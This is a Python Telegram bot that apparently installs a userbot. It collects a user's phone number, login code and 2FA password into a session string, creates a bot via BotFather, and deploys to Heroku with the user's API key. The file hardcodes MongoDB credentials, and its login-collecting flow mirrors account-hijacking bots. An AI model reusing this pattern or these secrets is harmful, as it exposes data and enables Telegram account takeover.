import os
import heroku3
import asyncio
import random
import string
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PasswordHashInvalidError
)
from telethon.tl.functions.channels import JoinChannelRequest
from motor.motor_asyncio import AsyncIOMotorClient

# --- PROFESSIONAL CONFIGURATION ---
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
# Sabit MongoDB Linkin (Bura öz linkini yapışdır)
MONGO_URL = "mongodb+srv://cabbarovxeyal32_db_user:Xeyal032aze@cluster0.f3gogmg.mongodb.net/?appName=Cluster0" 
GITHUB_REPO = "https://github.com/Xeyaldi/userbot"

# MongoDB Bağlantı Protokolu
mongo_client = AsyncIOMotorClient(MONGO_URL)
db = mongo_client["ht_generator_db"]
users_col = db["users"]

# Setup Bot İnstansiyası
bot = TelegramClient('ht_setup_bot', API_ID, API_HASH)

def generate_unique_name(length=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🛡 **HT USERBOT | Tam Avtomatlaşdırılmış İnfrastruktur**\n\n"
        "Sistemimiz hər şeyi sizin yerinizə həll edir. Artıq BotFather və ya App Name ilə vaxt itirməyə ehtiyac yoxdur.\n\n"
        "🔹 **Tam Avtomatik:** Bot yaradılması və App adı təyini sistem tərəfindən icra olunur.\n"
        "🔹 **Multi-Setup:** Bir Heroku API ilə fərqli-fərqli botlar qura bilərsiniz.\n\n"
        "Başlamaq üçün aşağıdakı düyməyə sıxın.",
        buttons=[
            [Button.inline("💎 Quraşdırmanı Başlat", data="setup")],
            [Button.url("🌐 Rəsmi Kanal", "https://t.me/ht_bots")]
        ]
    )

@bot.on(events.CallbackQuery(data="setup"))
async def setup_process(event):
    user_id = event.sender_id
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            # 1. Addım: Nömrə
            await conv.send_message("📝 **Addım 1:** Telefon nömrənizi daxil edin.\n_(Məsələn: +994XXXXXXXXX)_")
            phone = (await conv.get_response()).text
            
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(phone)

            # 2. Addım: Kod (İstədiyin mətnlə düzəldildi)
            await conv.send_message("🔐 **Addım 2:** Telegram tərəfindən gönderilən 5 rəqəmli kodu daxil edin.\n\n⚠️ **Protokol:** Kodu rəqəmlər arasına boşluq qoyaraq daxil edin.\nNümunə: `1 2 3 4 5`", parse_mode="markdown")
            otp_code = (await conv.get_response()).text.replace(" ", "")

            try:
                await client.sign_in(phone, otp_code)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **2FA (İkiadımlı təsdiq) parolu daxil edin:**")
                await client.sign_in(password=(await conv.get_response()).text)
            except (PhoneCodeInvalidError, PasswordHashInvalidError):
                await conv.send_message("❌ **Xəta:** Daxil edilən məlumatlar yanlışdır. Yenidən /start yazın.")
                return

            string_session = client.session.save()
            status_msg = await conv.send_message("⚙️ **Addım 3:** Bot yaradılır və App adı təyin edilir...")

            # --- AVTOMATİK BOTFATHER ---
            helper_token = ""
            bot_username = f"HT_{generate_unique_name(5)}_Bot"
            async with client.conversation("@BotFather") as bf_conv:
                await bf_conv.send_message("/newbot")
                await bf_conv.get_response()
                await bf_conv.send_message("HT Helper Bot")
                await bf_conv.get_response()
                await bf_conv.send_message(bot_username)
                bf_res = await bf_conv.get_response()
                if "Done!" in bf_res.text:
                    helper_token = bf_res.text.split("t.me/")[1].split("\n")[1].split(" ")[0]
                else:
                    await status_msg.edit("❌ **BotFather Limiti:** Hesabda yeni bot yaratmaq mümkün olmadı.")
                    return

            # --- HEROKU PROSESİ ---
            await status_msg.edit("🔑 **Addım 4:** Heroku API Key-inizi daxil edin:")
            h_api = (await conv.get_response()).text
            h_app_name = f"ht-user-{generate_unique_name(8)}"

            await status_msg.edit(f"⌛ **Sistem Buluda Yüklənir...**\n📦 App Name: `{h_app_name}`")

            try:
                h_conn = heroku3.from_key(h_api)
                # App yaradılır və stack heroku-22 təyin edilir
                app = h_conn.create_app(name=h_app_name, region_id_or_name='eu', stack_id_or_name='heroku-22')
                
                app.config().update({
                    'API_ID': str(API_ID),
                    'API_HASH': API_HASH,
                    'SESSION_STRING': string_session,
                    'BOT_TOKEN': helper_token,
                    'MONGO_URL': MONGO_URL,
                    'OWNER_ID': str(user_id),
                    'LOG_GROUP_AUTO': "True"
                })

                # Build prosesi (app obyekti üzərindən çağırıldı)
                source_url = f"https://api.github.com/repos/Xeyaldi/userbot/tarball/main"
                app.create_build(source_url=source_url)

                await status_msg.edit(
                    "✅ **Quraşdırma Uğurla Tamamlandı!**\n\n"
                    f"🤖 **Köməkçi Bot:** @{bot_username}\n"
                    f"📦 **App Adı:** `{h_app_name}`\n\n"
                    "🚀 Hesabınızda `.htlive` yazaraq yoxlayın."
                )
            except Exception as e:
                await status_msg.edit(f"❌ **Heroku Xətası:** {e}")

        except Exception as e:
            await conv.send_message(f"⚠️ **Gözlənilməz Xəta:** {e}")

# --- ASYNCIO EVENT LOOP PROTOCOL ---
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ HT Professional Setup Bot Onlayndır!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
